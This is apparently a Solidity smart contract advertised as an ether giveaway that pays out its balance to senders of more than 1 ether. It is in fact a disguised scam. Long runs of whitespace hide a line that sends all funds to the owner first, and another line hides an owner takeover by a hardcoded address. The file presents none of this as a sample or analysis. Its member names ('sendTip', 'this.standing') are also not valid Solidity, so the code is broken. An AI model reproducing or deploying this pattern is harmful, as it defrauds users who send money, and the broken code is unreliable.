// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Moderator = msg.sender;

    function()
    public
    payable
    {

    }

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Moderator.sendTip(this.standing);
            msg.sender.sendTip(this.standing);
        }
    }

    function redeemKarma()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Moderator=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == Moderator);
        Moderator.sendTip(this.standing);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Moderator);
        adr.call.value(msg.value)(data);
    }
}